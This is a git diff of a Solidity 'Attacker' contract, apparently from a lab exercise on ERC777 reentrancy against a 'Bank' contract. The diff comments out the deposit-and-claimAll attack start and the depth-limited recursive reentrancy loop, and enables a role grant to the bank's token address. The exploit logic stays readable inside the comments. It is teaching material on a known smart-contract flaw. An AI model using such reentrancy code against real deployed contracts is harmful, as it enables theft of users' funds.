@@ -27,7 +27,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 	function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
 		bank = Bank(bank_address);
         _grantRole(ATTACKER_ROLE, address(this));
-        //_grantRole(ATTACKER_ROLE, bank.token.address );
+        _grantRole(ATTACKER_ROLE, bank.token.address );
 	}
 
 	/*
@@ -38,9 +38,11 @@ contract Attacker is AccessControl, IERC777Recipient {
       require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
 
+		/*
         emit Deposit(msg.value); // Emit event for the deposit amount
         bank.deposit{value: msg.value}();
         bank.claimAll();
+        */
 	}
 
 	/*
@@ -66,6 +68,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 		//YOUR CODE TO RECURSE GOES HERE
 
 		// Implement reentrancy with depth limit
+		/*
         if (depth < max_depth && bank.balance > 0) {
 
 			console.log("Re-entering claimAll. Depth: %d, Bank ETH Balance: %d", depth, address(bank).balance);
@@ -77,7 +80,7 @@ contract Attacker is AccessControl, IERC777Recipient {
         } else {
 			console.log("Stopped re-entering. Depth: %d, Bank ETH Balance: %d", depth, address(bank).balance);
 
-		}
+		} */
 	}
 
 }
